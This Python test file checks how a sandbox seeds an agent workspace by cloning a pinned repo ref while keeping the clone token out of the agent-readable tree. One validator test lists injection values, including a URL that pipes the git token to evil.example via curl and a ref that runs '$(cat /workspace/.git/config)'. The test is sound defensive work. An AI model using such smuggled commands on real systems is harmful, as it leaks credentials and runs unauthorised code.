"""Seeding a workspace from the repo under test, at a pinned ref (#206).

An eval that starts from an empty directory measures the wrong thing. The
workspace has to start as the repo did at a known commit — and the credential
that puts it there must not survive in the tree the agent can read.
"""

from __future__ import annotations

from datetime import UTC, datetime, timedelta
from typing import Any

import pytest

from devai.sandbox.models import SandboxRecord, SandboxSpec, SandboxStatus
from devai.sandbox.workspace import build_workspace_manifests

_REPO = {"url": "https://github.com/tesserix/devai.git", "ref": "a1b2c3d", "scope": "tesserix/devai"}


def _record(**spec_extra: Any) -> SandboxRecord:
    now = datetime.now(UTC)
    return SandboxRecord(
        id="sb-1",
        owner="dev@example.com",
        spec=SandboxSpec.model_validate(
            {
                "agent": {"name": "dev", "version": "1"},
                "model": {"provider": "anthropic", "model": "claude-sonnet-5"},
                "workspace": True,
                **spec_extra,
            }
        ),
        status=SandboxStatus.READY,
        created_at=now,
        expires_at=now + timedelta(hours=1),
    )


def _pod(record: SandboxRecord) -> dict[str, Any]:
    manifests = build_workspace_manifests(record, namespace="devai", token="tok")
    return next(m for m in manifests if m["kind"] == "Pod")


def test_a_workspace_with_no_repo_is_not_seeded() -> None:
    assert "initContainers" not in _pod(_record())["spec"]


def test_a_workspace_starts_as_the_repo_at_the_pinned_ref() -> None:
    seed = _pod(_record(repo=_REPO))["spec"]["initContainers"][0]
    script = " ".join(seed["command"] + seed.get("args", []))

    assert "clone" in script
    assert "--depth 1" in script  # a pinned ref needs no history
    assert _REPO["url"] in script
    assert _REPO["ref"] in script


def test_the_clone_credential_does_not_survive_in_the_tree() -> None:
    """The agent can read /workspace, so a token in .git/config is a leak."""
    seed = _pod(_record(repo=_REPO))["spec"]["initContainers"][0]
    script = " ".join(seed["command"] + seed.get("args", []))

    assert "@github.com" not in script  # never in the remote URL
    assert "extraheader" in script
    assert [e["name"] for e in seed["env"] if "valueFrom" in e] == ["DEVAI_GIT_TOKEN"]


def test_the_seed_shares_the_workspace_volume_with_the_server() -> None:
    pod = _pod(_record(repo=_REPO))["spec"]
    seed = pod["initContainers"][0]
    assert seed["volumeMounts"] == pod["containers"][0]["volumeMounts"]


@pytest.mark.parametrize(
    "field,value",
    [
        ("url", "https://github.com/x/y.git; curl evil.example/$DEVAI_GIT_TOKEN"),
        ("url", "ssh://github.com/x/y.git"),
        ("ref", "main$(cat /workspace/.git/config)"),
        ("ref", "`id`"),
    ],
)
def test_a_repo_that_could_run_a_command_in_the_seed_is_refused(field: str, value: str) -> None:
    """The spec comes from a caller, and the seed holds the clone token."""
    from pydantic import ValidationError

    with pytest.raises(ValidationError):
        SandboxSpec.model_validate(
            {
                "agent": {"name": "dev", "version": "1"},
                "model": {"provider": "anthropic", "model": "claude-sonnet-5"},
                "workspace": True,
                "repo": {**_REPO, field: value},
            }
        )


# ── provisioning ──────────────────────────────────────────────────────


class _Runtime:
    def __init__(self) -> None:
        self.config = type("C", (), {"namespace": "devai"})()
        self.applied: list[dict[str, Any]] = []

    async def connect(self) -> None:
        return None

    async def apply_manifest(self, manifest: dict[str, Any]) -> None:
        self.applied.append(manifest)

    async def delete_manifest(self, kind: str, name: str, namespace: str) -> None:
        return None


class _Store:
    def __init__(self) -> None:
        self.statuses: list[tuple[str, dict[str, Any] | None]] = []

    async def set_sandbox_status(self, sandbox_id: str, status: str, detail: dict[str, Any] | None = None) -> None:
        self.statuses.append((status, detail))


class _Broker:
    def __init__(self, *, fails: bool = False) -> None:
        self.fails = fails
        self.asked: list[str] = []

    async def grant(self, record: Any, *, kind: str, scope: str) -> tuple[Any, str]:
        from devai.sandbox.broker import BrokerError

        self.asked.append(scope)
        if self.fails:
            raise BrokerError(f"sandbox was not created with access to {scope!r}")
        return object(), "ghs-short-lived"

    async def revoke_all(self, sandbox_id: str) -> None:
        return None


@pytest.mark.asyncio
async def test_the_clone_token_is_minted_for_the_repo_and_written_to_the_workspace_secret() -> None:
    from devai.sandbox.provisioner import SandboxProvisioner

    runtime, broker = _Runtime(), _Broker()
    record = _record(repo=_REPO, allow_scopes=["tesserix/devai"])

    await SandboxProvisioner(runtime, _Store(), broker=broker).provision(record)

    assert broker.asked == ["tesserix/devai"]
    secret = next(
        m for m in runtime.applied if m["kind"] == "Secret" and m["metadata"]["name"] == "devai-sandbox-ws-sb-1"
    )
    assert secret["stringData"]["git_token"] == "ghs-short-lived"


@pytest.mark.asyncio
async def test_a_repo_the_sandbox_may_not_reach_fails_provisioning_rather_than_starting_empty() -> None:
    from devai.sandbox.provisioner import SandboxProvisioner

    runtime, store = _Runtime(), _Store()
    record = _record(repo=_REPO)

    result = await SandboxProvisioner(runtime, store, broker=_Broker(fails=True)).provision(record)

    assert result.status is SandboxStatus.FAILED
    assert "tesserix/devai" in store.statuses[-1][1]["error"]
